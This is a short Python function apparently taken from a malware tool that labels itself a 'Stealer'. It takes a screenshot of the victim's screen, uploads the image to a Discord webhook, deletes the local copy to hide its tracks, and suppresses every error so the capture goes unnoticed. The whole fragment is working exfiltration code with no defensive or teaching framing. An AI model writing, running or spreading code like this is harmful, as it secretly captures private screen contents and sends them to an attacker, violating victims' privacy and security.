def screnshit():
 try:
  xas= os.getcwd()
  cooked = pyautogui.screenshot()
  coked = "skibidisigmas.png"
  cooked.save(coked)
  x = DiscordWebhook(url=wbz, username="[I458I] Stealer.", avatar_url="https://cdn.discordapp.com/attachments/1169301289063170069/1196417873095168030/attachment_109193957.png?ex=65b78df9&is=65a518f9&hm=525df0ec3789a7503cdf8592328546690cc678ac9bc4bb4c22a20bd2cabebed2&")
  x.add_file(file=open(coked, "rb"), filename="skibidisigmas.png")
  x.execute()
  os.remove("skibidisigmas.png")
 except:pass